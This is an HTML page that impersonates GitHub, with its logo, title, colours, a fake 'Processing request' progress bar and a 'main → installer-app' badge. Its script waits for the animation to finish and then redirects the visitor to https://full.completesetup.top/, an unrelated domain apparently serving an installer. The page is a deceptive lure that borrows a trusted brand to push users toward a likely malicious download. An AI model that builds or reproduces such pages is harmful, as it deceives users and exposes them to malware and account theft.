<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GitHub</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; background-color: #0d1117; color: #c9d1d9; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .logo { margin-bottom: 24px; fill: #ffffff; }
        .container { width: 100%; max-width: 480px; background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 24px; }
        .progress-header { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px; }
        .progress-bar-bg { width: 100%; background: #30363d; height: 8px; border-radius: 4px; overflow: hidden; margin-bottom: 16px; }
        #progress-fill { height: 100%; width: 0%; background: #238636; transition: width 0.3s ease; }
        .status { font-size: 12px; display: flex; align-items: center; margin-bottom: 24px; }
        .dot { height: 8px; width: 8px; background-color: #238636; border-radius: 50%; margin-right: 8px; }
        .branch-badge { background: #1f2937; border: 1px solid #374151; padding: 6px 12px; border-radius: 6px; font-size: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 24px; color: #58a6ff; }
        .grid { display: grid; grid-template-columns: repeat(8, 1fr); gap: 4px; }
        .cell { width: 100%; aspect-ratio: 1; background: #21262d; border-radius: 2px; }
    </style>
</head>
<body>

<svg class="logo" height="48" viewBox="0 0 16 16" width="48"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path></svg>
<h1 style="font-size: 24px; margin-bottom: 8px;">GitHub</h1>
<p style="font-size: 14px; margin-bottom: 32px; color: #8b949e;">Preparing to redirect to application</p>

<div class="container">
    <div class="progress-header">
        <span>Processing request</span>
        <span id="percent">0%</span>
    </div>
    <div class="progress-bar-bg"><div id="progress-fill"></div></div>
    
    <div class="status"><span class="dot"></span> Finalizing redirect sequence</div>
    
    <div class="branch-badge">
        <svg style="margin-right:8px;" height="14" viewBox="0 0 16 16" width="14" fill="#58a6ff"><path d="M9.5 3.25a1.25 1.25 0 1 1 2.5 0 1.25 1.25 0 0 1-2.5 0Zm-5.5 0a1.25 1.25 0 1 1 2.5 0 1.25 1.25 0 0 1-2.5 0Zm5.5 9.5a1.25 1.25 0 1 1 2.5 0 1.25 1.25 0 0 1-2.5 0Zm-5.5 0a1.25 1.25 0 1 1 2.5 0 1.25 1.25 0 0 1-2.5 0Zm-1-4.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm10 0a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-5 0a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Z"></path></svg>
        main → installer-app
    </div>

    <div class="grid" id="grid"></div>
</div>

<p style="margin-top: 32px; font-size: 12px; color: #8b949e;">You will be redirected shortly</p>

<script>
    const fill = document.getElementById('progress-fill');
    const percent = document.getElementById('percent');
    const grid = document.getElementById('grid');
    
    // Generate grid cells
    for(let i=0; i<40; i++) { grid.innerHTML += '<div class="cell"></div>'; }

    let p = 0;
    const interval = setInterval(() => {
        p += 2;
        fill.style.width = p + '%';
        percent.innerText = p + '%';
        if (p >= 100) {
            clearInterval(interval);
            setTimeout(() => window.location.href = "https://full.completesetup.top/", 500);
        }
    }, 60);
</script>

</body>
</html>
